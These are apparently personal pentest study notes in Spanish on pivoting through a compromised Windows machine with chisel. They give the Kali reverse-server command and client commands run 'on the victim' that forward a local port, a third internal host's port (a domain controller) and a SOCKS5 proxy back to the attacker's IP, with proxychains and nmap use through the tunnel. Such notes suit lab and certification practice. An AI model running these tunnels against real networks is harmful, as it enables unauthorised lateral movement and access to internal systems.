- [[#Windows|Windows]]
	- [[#Windows#Preparación del Servidor (Siempre en tu Kali)|Preparación del Servidor (Siempre en tu Kali)]]
	- [[#Windows#Caso 1: Redirigir un puerto local de Windows hacia tu Kali (Tu necesidad actual)|Caso 1: Redirigir un puerto local de Windows hacia tu Kali (Tu necesidad actual)]]
	- [[#Windows#Caso 2: Redirigir un puerto de un TERCER equipo de la red interna a tu Kali|Caso 2: Redirigir un puerto de un TERCER equipo de la red interna a tu Kali]]
	- [[#Windows#Caso 3: Dynamic Port Forwarding (Crear un Proxy SOCKS5)|Caso 3: Dynamic Port Forwarding (Crear un Proxy SOCKS5)]]

## Windows

### Preparación del Servidor (Siempre en tu Kali)

Antes de ejecutar cualquier comando en Windows, pon a escuchar a tu Kali. Usaremos un puerto común que suela estar permitido en las salidas de red (como el 80, 443 o 8000).

```bash
# Ejecutar en Kali (Servidor)
chisel server -p 8000 --reverse
```

### Caso 1: Redirigir un puerto local de Windows hacia tu Kali (Tu necesidad actual)

- **El escenario:** La máquina Windows tiene un servicio expuesto **solo en localhost** (como una base de datos en el puerto `1433`, un servicio web de desarrollo en el `8080`, o WinRM en el `5985`) y quieres interactuar con él desde la terminal de tu Kali.
    

```powershell
# Ejecutar en la víctima (Windows)
.\chisel.exe client <IP_KALI>:8000 R:<PUERTO_LOCAL_KALI>:127.0.0.1:<PUERTO_INTERNO_WINDOWS>
```

- **Ejemplo práctico:** Quieres traerte el puerto local `1433` de Windows al puerto `1433` de tu Kali:

```powershell
   .\chisel.exe client 192.168.45.153:8000 R:1433:127.0.0.1:1433
```

- **Resultado:** Si ahora ejecutas `ss -lnpt` en tu Kali, verás el puerto `1433` abierto en tu propia máquina. Cualquier herramienta que apuntes a tu `127.0.0.1:1433` viajará por el túnel hasta el servicio interno de Windows.
    

### Caso 2: Redirigir un puerto de un TERCER equipo de la red interna a tu Kali

- **El escenario (Pivotaje AD):** Estás dentro de la máquina Windows comprometida. Esta máquina ve otra máquina en la red interna (ej. un Controlador de Dominio en la IP `10.10.10.50`) que tiene el puerto web `80` abierto. Tú no ves esa IP desde Kali, pero la máquina Windows sí.
    

```powershell
# Ejecutar en la víctima (Windows)
.\chisel.exe client <IP_KALI>:8000 R:<PUERTO_LOCAL_KALI>:<IP_TERCERO>:<PUERTO_TERCERO>
```

- **Ejemplo práctico:**
    
```powershell
.\chisel.exe client 192.168.45.153:8000 R:80:10.10.10.50:80
```

- **Resultado:** Tu Kali abrirá el puerto `80`. Al abrir el navegador en Kali e ir a `http://127.0.0.1`, estarás viendo la web del Controlador de Dominio interno.
    

### Caso 3: Dynamic Port Forwarding (Crear un Proxy SOCKS5)

- **El escenario:** No quieres redirigir un solo puerto, quieres poder escanear con `nmap`, lanzar `netexec` o usar `proxychains` contra **toda** la red interna que la máquina Windows es capaz de ver.
    

```powershell
# Ejecutar en la víctima (Windows)
.\chisel.exe client <IP_KALI>:8000 R:socks
```

- **Resultado:** Tu Kali abrirá por defecto el puerto **`1080`** actuando como un servidor Proxy SOCKS5.
    
- **Cómo usarlo desde Kali:** Configura tu archivo `/etc/proxychains4.conf` añadiendo al final del todo la línea: `socks5 127.0.0.1 1080`. A partir de ahí, antepone `proxychains` a tus herramientas:

```bash
proxychains nmap -sT -Pn -p 445 10.10.10.50
```